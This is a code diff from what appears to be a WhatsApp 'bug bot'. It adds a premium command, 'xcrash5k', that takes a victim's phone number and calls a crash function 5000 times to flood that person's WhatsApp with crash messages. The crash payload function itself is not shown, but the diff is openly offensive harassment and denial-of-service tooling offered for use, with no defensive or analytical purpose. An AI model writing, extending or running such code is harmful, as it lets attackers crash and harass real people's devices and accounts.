@@ -1856,6 +1856,18 @@ case 'xcrash1k':{
     replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
     }
     break
+case 'xcrash5k':{
+    if (!isPremium) return replygcxeon(mess.prem)
+     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
+     victim = text.split("|")[0]+'@s.whatsapp.net'
+    amount = "5000"
+    for (let i = 0; i < amount; i++) {
+    XeonyCrashy(pushname,victim)
+    await sleep(3500)
+    }
+    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+    }
+    break
 case 'xcrash2':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
